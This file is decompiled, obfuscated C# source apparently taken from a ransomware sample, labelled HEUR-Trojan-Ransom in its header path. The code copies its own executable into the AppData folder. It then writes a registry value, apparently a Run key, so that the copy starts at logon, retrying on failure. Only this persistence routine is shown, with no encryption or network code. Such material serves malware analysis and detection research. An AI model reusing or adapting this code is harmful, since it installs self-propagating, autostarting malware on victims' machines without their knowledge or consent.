// Decompiled with JetBrains decompiler
// Type: .
// Assembly: coproccessor, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 489BB54C-AC64-4776-B7C7-9CD76A5742AF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-c8a5aa891fc37cf6a3724b7ba25ce00e61d4f00bdc5d5c35ff70f3359185f7f5.exe

using \u0006;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace \u0006
{
  internal class \u008D\u001A
  {
    public class \u000E\u0005
    {
      public static string \u0001 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3804), \u0008.\u0007(227));
      public static string \u0002 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3833), \u0008.\u0007(227)) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3858), \u0008.\u0007(227));

      public static void \u0004\u0005()
      {
        int num1 = 0;
        try
        {
          if (!File.Exists(\u008D\u001A.\u000E\u0005.\u0002))
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, \u008D\u001A.\u000E\u0005.\u0002, true);
        }
        catch (Exception ex)
        {
          int num2;
          int lErl = num2;
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        while (true)
        {
          int num3 = 1;
          try
          {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0007\u001E.\u0005\u001E(\u0008.\u0007(3883), \u0008.\u0007(227)), true);
            registryKey.SetValue(\u008D\u001A.\u000E\u0005.\u0001, (object) \u008D\u001A.\u000E\u0005.\u0002);
            registryKey.Close();
            Thread.Sleep(5000);
            try
            {
              \u0004\u001E.\u008C.Abort();
              break;
            }
            catch (Exception ex)
            {
              int lErl = num3;
              ProjectData.SetProjectError(ex, lErl);
              ProjectData.ClearProjectError();
              break;
            }
          }
          catch (Exception ex1)
          {
            int lErl1 = num3;
            ProjectData.SetProjectError(ex1, lErl1);
            if (num1 == 3)
            {
              try
              {
                \u0004\u001E.\u008C.Abort();
              }
              catch (Exception ex2)
              {
                int lErl2 = num3;
                ProjectData.SetProjectError(ex2, lErl2);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
              break;
            }
            checked { ++num1; }
            ProjectData.ClearProjectError();
          }
        }
      }
    }
  }
}
